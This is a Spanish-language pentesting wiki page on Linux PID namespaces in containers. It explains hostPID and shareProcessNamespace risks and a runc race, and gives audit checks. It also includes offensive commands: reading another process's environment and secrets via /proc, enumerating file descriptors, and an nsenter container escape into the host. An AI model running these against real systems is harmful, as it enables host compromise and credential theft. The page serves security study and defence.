# Espacio de nombres PID

{{#include ../../../../../banners/hacktricks-training.md}}

## Descripción general

El espacio de nombres PID controla cómo se numeran los procesos y qué procesos son visibles. Por eso un contenedor puede tener su propio PID 1 aunque no sea una máquina real. Dentro del espacio de nombres, la carga de trabajo ve lo que parece un árbol de procesos local. Fuera del espacio de nombres, el host sigue viendo los PID reales del host y todo el panorama de procesos.<sup>[[3]](#references)</sup>

Desde el punto de vista de la seguridad, el espacio de nombres PID es importante porque la visibilidad de los procesos es valiosa. Una vez que una carga de trabajo puede ver los procesos del host, puede ser capaz de observar nombres de servicios, argumentos de línea de comandos, secretos pasados en los argumentos de los procesos, estado derivado del entorno a través de `/proc` y posibles objetivos para entrar en otros espacios de nombres. Si puede hacer algo más que simplemente ver esos procesos, por ejemplo enviar señales o usar ptrace en las condiciones adecuadas, el problema se vuelve mucho más grave.

## Funcionamiento

Un nuevo espacio de nombres PID comienza con su propia numeración interna de procesos. El primer proceso creado dentro de él se convierte en el PID 1 desde el punto de vista del espacio de nombres, lo que también significa que obtiene una semántica especial similar a la de init para los hijos huérfanos y el comportamiento de las señales. Esto explica muchas particularidades de los contenedores relacionadas con los procesos init, la recolección de procesos zombie y el motivo por el que a veces se utilizan wrappers init pequeños en los contenedores.<sup>[[3]](#references)</sup>

Los espacios de nombres PID forman una jerarquía. Un proceso en un espacio de nombres ancestral puede dirigirse a sus descendientes usando el PID asignado en ese ancestro, pero un descendiente no puede dirigirse a tareas que solo existen en el ancestro mediante syscalls normales basadas en PID ni usar `setns()` para ascender a un espacio de nombres PID ancestral. Un procfs propiedad del ancestro y expuesto deliberadamente al descendiente aún puede leakear la vista de procesos del ancestro. Además, unirse a un espacio de nombres PID con `setns()` cambia el espacio de nombres para los **futuros hijos**, no para el propio llamador; por ello, las herramientas hacen fork después de unirse. Un montaje de procfs conserva la vista PID del proceso que lo montó, razón por la que crear un procfs nuevo después de `unshare(CLONE_NEWPID)` es relevante para la seguridad y no solo algo cosmético.<sup>[[3]](#references)</sup>

La lección de seguridad importante es que un proceso puede parecer aislado porque solo ve su propio árbol de PID, pero ese aislamiento puede eliminarse deliberadamente. Docker expone esto mediante `--pid=host`, mientras que Kubernetes lo hace mediante `hostPID: true`. Una vez que el contenedor se une al espacio de nombres PID del host, la carga de trabajo ve directamente los procesos del host y muchas vías de ataque posteriores se vuelven mucho más realistas.

## Lab

Para crear manualmente un espacio de nombres PID:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Ahora el shell ve una vista privada de los procesos. El flag `--mount-proc` es importante porque monta una instancia de procfs que coincide con el nuevo namespace de PID, haciendo que la lista de procesos sea coherente desde dentro.<sup>[[3]](#references)</sup>

Para comparar el comportamiento del contenedor:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
La diferencia es inmediata y fácil de entender, por lo que este es un buen primer laboratorio para los lectores.

## Uso en Runtime

Los contenedores normales en Docker, Podman, containerd y CRI-O obtienen su propio PID namespace. Los contenedores de Kubernetes normalmente tienen vistas de PID separadas; `shareProcessNamespace: true` crea deliberadamente una vista para todo el Pod.<sup>[[4]](#references)</sup> Por el contrario, `hostPID: true` selecciona el PID namespace del nodo. Los entornos LXC/Incus dependen de la misma primitiva del kernel, aunque los casos de uso de system-containers pueden exponer árboles de procesos más complicados y fomentar más atajos de debugging.

La misma regla se aplica en todas partes: si el runtime decidió no aislar el PID namespace, eso representa una reducción deliberada del límite del contenedor.

## Configuraciones incorrectas

La configuración incorrecta canónica es compartir el PID del host. Los equipos suelen justificarlo por conveniencia para debugging, monitoring o service-management, pero siempre debe tratarse como una excepción de seguridad significativa. Incluso si el contenedor no tiene una primitive de escritura inmediata sobre los procesos del host, la visibilidad por sí sola puede revelar mucha información sobre el sistema. Cuando se añaden capabilities como `CAP_SYS_PTRACE` o un acceso útil a procfs, el riesgo aumenta significativamente.

Otro error es asumir que, como el workload no puede matar ni hacer ptrace sobre los procesos del host de forma predeterminada, compartir el PID del host es inofensivo. Esa conclusión ignora el valor de la enumeración, la disponibilidad de objetivos para entrar en namespaces y la forma en que la visibilidad de los PID se combina con otros controles debilitados.

### Compartición de procesos para todo el Pod de Kubernetes

`shareProcessNamespace: true` es diferente de `hostPID`: expone los procesos de los **otros contenedores del mismo Pod**, no los procesos del nodo. Un sidecar o contenedor de debugging comprometido puede entonces enumerar las command lines y los datos de entorno de los contenedores hermanos, sujeto a los checks de acceso de procfs; enviar signals cuando las credenciales lo permiten; y recorrer el filesystem de un contenedor hermano mediante `/proc/<pid>/root`. Kubernetes advierte explícitamente que los secrets de la command line/el entorno y los filesystems de los contenedores quedan protegidos únicamente por los permisos Unix aplicables.<sup>[[4]](#references)</sup>

Revisión útil desde el lado del cluster:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Desde un contenedor comprometido en un PID namespace de todo el Pod, primero prueba el acceso real en lugar de asumir que la visibilidad equivale a la legibilidad:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## Abuso

Si el PID namespace del host se comparte, un atacante puede inspeccionar los procesos del host, recopilar argumentos de procesos, identificar servicios interesantes, localizar PIDs candidatos para `nsenter` o combinar la visibilidad de procesos con privilegios relacionados con ptrace para interferir con el host o con workloads vecinos. En algunos casos, simplemente ver el proceso de larga duración adecuado basta para replantear el resto del plan de ataque.

El primer paso práctico siempre es confirmar que los procesos del host son realmente visibles:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Una vez que los PID del host son visibles, los argumentos de los procesos y los objetivos de entrada en namespaces suelen convertirse en la fuente de información más útil:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Si `nsenter` está disponible y existen privilegios suficientes, comprueba si un proceso visible del host puede utilizarse como puente entre namespaces:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Incluso cuando la entrada está bloqueada, compartir los PID del host ya es valioso porque revela la distribución de servicios, los componentes del runtime y los procesos privilegiados candidatos a los que dirigirse después. La visibilidad de los PID por sí sola **no** concede permiso para enviar señales, realizar tracing, leer entradas sensibles de `/proc/<pid>` ni unirse a los demás namespaces del objetivo; las credenciales, la capacidad de volcado, las capabilities en el user namespace propietario del namespace objetivo, la política de Yama/LSM y seccomp siguen siendo importantes.<sup>[[3]](#references)</sup> Consulta [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) para ver ejemplos de process injection.

La visibilidad de los PID del host también hace más realista el abuso de file descriptors. Si un proceso privilegiado del host o una workload vecina tiene abierto un archivo o socket sensible, el atacante puede ser capaz de inspeccionar `/proc/<pid>/fd/` y acceder al objeto subyacente, dependiendo de las comprobaciones de tipo ptrace, la propiedad, las opciones de montaje de procfs, el tipo de objeto y el modelo del servicio objetivo. Ver simplemente un symlink de FD no significa que pueda abrirse, y un socket no puede duplicarse simplemente abriendo su symlink `/proc/<pid>/fd/N`. Para la primitiva distinta `pidfd_getfd()` y sus comprobaciones de autorización, consulta [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Estos comandos son útiles porque indican si `hidepid=1` o `hidepid=2` está reduciendo la visibilidad entre procesos y si descriptores obviamente interesantes, como archivos secretos abiertos, logs o sockets Unix, son visibles en absoluto.

### Ejemplo completo: PID del host + `nsenter`

Compartir el PID del host se convierte en un escape directo del host cuando el proceso también tiene privilegios suficientes para unirse a los namespaces del host:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Si el comando se ejecuta correctamente, el proceso del contenedor ahora se está ejecutando en los namespaces de mount, UTS, network, IPC y PID del host. El impacto es un compromiso inmediato del host.

Incluso cuando `nsenter` no está disponible, se puede lograr el mismo resultado mediante el binario del host si el sistema de archivos del host está montado:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Notas recientes sobre el runtime

Algunos ataques relevantes para los PID namespaces no son configuraciones incorrectas tradicionales de `hostPID: true`, sino errores de implementación del runtime relacionados con cómo se aplican las protecciones de procfs durante la configuración del contenedor.

#### Race de `maskedPaths` hacia el procfs del host

En versiones vulnerables de `runc`, los atacantes capaces de controlar la imagen del contenedor o la carga de trabajo de `runc exec` podían provocar una race durante la fase de enmascaramiento reemplazando el `/dev/null` del contenedor por un symlink a una ruta sensible de procfs, como `/proc/sys/kernel/core_pattern`. Si la race tenía éxito, el bind mount de la ruta enmascarada podía terminar en el destino equivocado y exponer los parámetros globales de procfs del host al nuevo contenedor.<sup>[[1]](#references)</sup>

Comando útil para la revisión:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Esto es importante porque el impacto final puede ser el mismo que el de una exposición directa de procfs: `core_pattern` o `sysrq-trigger` escribibles, seguidos de ejecución de código en el host o una denegación de servicio. Las páginas específicas sobre [rutas enmascaradas](../masked-paths.md) y [montajes sensibles del host](../../sensitive-host-mounts.md) cubren la superficie de ataque general de procfs sin duplicarla aquí.

#### Inyección de namespaces con `insject`

Las herramientas de inyección de namespaces, como `insject`, demuestran que la interacción con un PID namespace no siempre requiere entrar previamente en el namespace objetivo antes de crear el proceso. Un helper puede conectarse posteriormente, usar `setns()` y ejecutar código mientras conserva la visibilidad del espacio de PID objetivo:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Este tipo de técnica es importante principalmente para la depuración avanzada, las herramientas ofensivas y los workflows de post-exploitation en los que el contexto del namespace debe unirse después de que el runtime ya haya inicializado la workload.

### Patrones relacionados de abuso de FD

Vale la pena destacar explícitamente dos patrones cuando los PIDs del host son visibles. Primero, un proceso privilegiado puede mantener abierto un file descriptor sensible después de `execve()` porque no se marcó con `O_CLOEXEC`. Segundo, los servicios pueden pasar file descriptors a través de Unix sockets mediante `SCM_RIGHTS`. En ambos casos, el objeto interesante ya no es el pathname, sino el handle ya abierto que un proceso con menos privilegios puede heredar o recibir.

Esto es importante al trabajar con containers porque el handle puede apuntar a `docker.sock`, un log privilegiado, un archivo de secretos del host u otro objeto de alto valor, incluso cuando no se puede acceder directamente al path desde el filesystem del container.

## Comprobaciones

El propósito de estos comandos es determinar si el proceso tiene una vista privada de los PIDs o si ya puede enumerar un panorama de procesos mucho más amplio.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
Qué es interesante aquí:<sup>[[3]](#references)</sup>

- Si la lista de procesos contiene servicios obvios del host, probablemente ya esté habilitado el uso compartido de PID del host.
- Ver solo un árbol diminuto y local del contenedor es la línea base normal; ver `systemd`, `dockerd` o daemons no relacionados no lo es.
- `NSpid` puede exponer el mapeo de PID entre namespaces anidados. El valor más a la izquierda es relativo al namespace de PID asociado con el montaje de procfs, seguido de los valores de los namespaces anidados sucesivamente.
- `readlink /proc/self/ns/pid` por sí solo no puede demostrar `hostPID`: un contenedor aislado también tiene un inode válido de namespace de PID. Correlaciónalo con la lista de procesos, el montaje de procfs, la configuración del runtime y un inode del namespace en el host cuando esté disponible.
- Una vez que los PID del host son visibles, incluso la información de procesos en modo de solo lectura resulta útil para el reconocimiento.

Si descubres un contenedor ejecutándose con uso compartido de PID del host, no lo trates como una diferencia meramente estética. Es un cambio importante en lo que el workload puede observar y potencialmente afectar.



## References

- [1] [Aviso de seguridad de runc: escape de contenedor mediante abuso de "masked path" debido a condiciones de carrera en montajes (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Lanzamiento de herramienta – insject: un inyector de Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Libro Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Compartir Process Namespace entre contenedores en un Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
